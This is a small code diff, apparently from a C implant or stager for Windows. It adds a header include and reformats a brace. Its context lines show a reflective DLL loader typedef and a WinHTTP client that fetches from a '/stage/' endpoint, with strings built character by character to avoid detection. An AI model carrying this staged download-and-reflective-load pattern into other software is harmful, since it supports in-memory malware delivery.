@@ -2,6 +2,7 @@
 // TODO: Close the web handles
 
 #include "addresshunter.h"
+#include "typedefs.h"
 #include <winnt.h>
 
 typedef ULONG_PTR (WINAPI *REFLECTIVELOADER)();
@@ -459,7 +460,8 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
     }
 }
 
-LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
+LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
+{
     WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
 
     WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
